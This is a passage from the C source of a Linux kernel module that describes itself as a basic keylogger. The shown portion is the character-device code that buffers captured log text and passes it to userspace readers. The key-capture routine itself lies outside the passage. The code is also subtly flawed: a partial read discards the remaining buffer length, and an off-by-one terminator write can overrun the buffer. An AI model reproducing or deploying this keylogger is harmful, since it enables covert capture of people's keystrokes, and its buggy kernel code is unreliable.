        HARKLE_KERROR(CHRDEV_NAME, device_read, "NULL pointer");  // DEBUGGING
    }
    else if (bufCount < 1)
    {
        HARKLE_KERROR(CHRDEV_NAME, device_read, "Invalid destination buffer size");  // DEBUGGING
    }
    else
    {
        HARKLE_KFINFO(CHRDEV_NAME, device_read, "Reading from device");

        if (bufCount < myLD.bufLength)
        {
            numBytesToRead = bufCount;
        }
        else
        {
            numBytesToRead = myLD.bufLength;
        }

        // printk(KERN_DEBUG "%s: bufCount is %lu\n", CHRDEV_NAME, bufCount);  // DEBUGGING
        // printk(KERN_DEBUG "%s: myLD.bufLength is %lu\n", CHRDEV_NAME, myLD.bufLength);  // DEBUGGING
        // printk(KERN_DEBUG "%s: Attempting to pass %lu bytes to the user", CHRDEV_NAME, numBytesToRead);  // DEBUGGING

        if (myLD.bufLength > 0)
        {
            tempRetVal = copy_to_user(bufStoreData, myLD.logBuf, numBytesToRead);

            // Success
            if (!tempRetVal)
            {
                // Everything was read
                if (numBytesToRead == myLD.bufLength)
                {
                    HARKLE_KFINFO(CHRDEV_NAME, device_read, "Total read executed");
                    retVal = numBytesToRead;
                    myLD.logBuf[0] = 0;  // Truncate current contents
                    myLD.bufLength = 0;  // Indicate the buffer is empty
                }
                // Partial read
                else
                {
                    HARKLE_KFINFO(CHRDEV_NAME, device_read, "Partial read executed");
                    // Save the return value
                    retVal = numBytesToRead;
                    // Move everything to the front
                    while (numBytesToRead < myLD.bufLength)
                    {
                        myLD.logBuf[i] = myLD.logBuf[numBytesToRead];
                        i++;
                        numBytesToRead++;
                    }
                    // Truncate it
                    myLD.logBuf[numBytesToRead] = 0;
                    // Reset the buffer length
                    myLD.bufLength = 0;
                }
            }
            // Error condition
            else
            {
                HARKLE_KERROR(CHRDEV_NAME, device_read, "copy_to_user() failed to copy all the bytes");  // DEBUGGING
                printk(KERN_DEBUG "%s: Failed to copy %lu bytes\n", CHRDEV_NAME, tempRetVal);  // DEBUGGING
                // printk(KERN_DEBUG "%s: Log device buffer currently holds '%s'\n", CHRDEV_NAME, myLD.logBuf);  // DEBUGGING
                retVal = numBytesToRead - tempRetVal;  // Return the number of bytes read
            }
        }
        else
        {
            // printk(KERN_DEBUG "%s: Device is empty", CHRDEV_NAME);  // DEBUGGING
            HARKLE_KFINFO(CHRDEV_NAME, device_read, "Device is empty");
        }
    }
    
    return retVal;
}

ssize_t device_write(struct file* filp, const char* bufSourceData, size_t bufCount, loff_t* curOffset)
{
    HARKLE_KFINFO(CHRDEV_NAME, device_write, "Write operations not implemented for this device.");  // DEBUGGING
    return bufCount;  // Lip service
}

int device_close(struct inode *inode, struct file *filp)
{
    up(&myLD.openSem);
    HARKLE_KFINFO(CHRDEV_NAME, device_close, "Closed device");  // DEBUGGING
    return 0;
}

static int write_to_chrdev(myLogDevice_ptr dstDev, char *srcBuf)
{
    // LOCAL VARIABLES
    int retVal = 0;
    size_t srcLen = 0;  // Length of srcBuf
    size_t dstSpace = 0;  // Remaining space in the destination buffer
    char *tmp_ptr = NULL;  // Destination address for the copy

    // INPUT VALIDATION
    if (!dstDev || !srcBuf)
    {
        retVal = -1;
        HARKLE_KERROR(DEVICE_NAME, write_to_chrdev, "NULL pointer");  // DEBUGGING
    }
    else if (!(*srcBuf))
    {
        retVal = -1;
        HARKLE_KERROR(DEVICE_NAME, write_to_chrdev, "Empty source buffer");  // DEBUGGING
    }
    else
    {
        // 0. Lock it
        retVal = down_interruptible(&myLD.busySem);
        if (retVal != 0)
        {
            printk(KERN_ALERT "%s: Unable to lock device during write_to_chrdev()\n", CHRDEV_NAME);  // DEBUGGING
            retVal = -1;
        }
        else
        {
            // HARKLE_KFINFO(CHRDEV_NAME, write_to_chrdev, "Device is locked while the kernel writes to it");  // DEBUGGING

            // 1. Size the input buffer
            srcLen = strlen(srcBuf);

            // 2. Determine the remaining space in the destination buffer
            dstSpace = CDEV_BUFF_SIZE - dstDev->bufLength;

            if (dstSpace >= srcLen)
            {
                tmp_ptr = (char*)(dstDev->logBuf + dstDev->bufLength);
            }
            else
            {
                HARKLE_KWARNG(DEVICE_NAME, write_to_chrdev, "Wrapping the character device buffer.  Data lost.");  // DEBUGGING
                tmp_ptr = (char*)dstDev->logBuf;
                dstDev->bufLength = 0;  // We're losing some data
            }

            if (tmp_ptr != strncpy(tmp_ptr, srcBuf, srcLen))
            {
                HARKLE_KERROR(DEVICE_NAME, write_to_chrdev, "strncpy() has failed");
            }
            else
            {
                *(tmp_ptr + srcLen + 1) = 0;  // Nul terminate it... for safety
                dstDev->bufLength += srcLen;  // Increase the buffer length
                retVal = srcLen;
            }

            // Release the lock
            up(&myLD.busySem);
        }
    }

    return retVal;
}

module_init(key_logger_init);
module_exit(key_logger_exit);

////////////////////////
/* DRIVER INFORMATION */
////////////////////////
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Joseph 'Makleford' Harkleroad");
MODULE_DESCRIPTION("A basic key logging Linux Kernel Module");
MODULE_VERSION("0.2"); // Not yet releasable
